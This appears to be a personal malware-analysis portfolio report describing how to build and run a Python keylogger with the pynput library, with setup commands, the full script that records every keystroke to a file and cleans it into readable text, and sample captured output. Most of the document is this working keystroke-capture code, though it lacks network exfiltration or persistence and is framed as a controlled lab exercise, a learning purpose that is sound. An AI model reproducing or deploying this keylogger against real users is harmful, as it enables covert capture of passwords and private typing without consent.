# Keylogger Malware Analysis Report

## Overview

This report documents the setup, development, and execution of a simulated keylogger for malware analysis practice. The keylogger captures keystrokes on a Linux system using Python, logs them to a file, and produces a cleaned version of the log for readable analysis.

## Environment Setup

### Project Directory Structure

```
~/Documents/ctf-portfolio/malware-analysis-lab/
```

### Virtual Environment Setup

```bash
python3 -m venv venv
source venv/bin/activate
pip install pynput
```

## Keylogger Script

### Purpose

The Python keylogger script captures keyboard input, stores raw keystrokes in `keylog.txt`, and processes the input into readable text in `keylog_cleaned.txt`.

### Integrated Script: `simulated_keylogger.py`

```python
from pynput import keyboard
import re

log_file = "keylog.txt"
clean_file = "keylog_cleaned.txt"

# Capture key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]\n")

# Stop listener on ESC
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Clean the raw log file
def clean_log():
    with open(log_file, "r") as f:
        raw = f.read()

    raw = raw.replace("[Key.space]", " ")
    raw = raw.replace("[Key.enter]", "\n")
    cleaned = re.sub(r"\[Key\.[^\]]+\]", "", raw)
    cleaned = cleaned.replace("[", "").replace("]", "")
    cleaned = re.sub(r"\n\s*\n", "\n", cleaned)
    cleaned = re.sub(r" +", " ", cleaned)

    with open(clean_file, "w") as f:
        f.write(cleaned)

    print(f"Cleaned log saved to {clean_file}")

# Start the listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()

# Clean the log after listener stops
clean_log()
```

## Execution

To run the keylogger:

```bash
source venv/bin/activate
python simulated_keylogger.py
```

* Press `Esc` to stop the keylogger.
* It will save:

  * Raw logs to `keylog.txt`
  * Cleaned logs to `keylog_cleaned.txt`

## Output Example

**`keylog_cleaned.txt`** after execution:

```
ls
cd bandit
ls
cd bandit30
cat bandit30
cat bandit1
clear
```

## Observations

* Noisy keys like `Key.ctrl`, `Key.shift`, etc. are removed.
* Meaningful inputs like commands and typed text are preserved and formatted.
* Script handles cleanup immediately after logging session ends.

## Notes

* This is a safe, simulated keylogger used solely in a controlled analysis lab.
* It is part of a malware analysis portfolio and does **not** perform any network communication or persistence.

---

Next Step: Document additional malware behaviors (e.g., downloader, fake ransomware, persistence techniques).
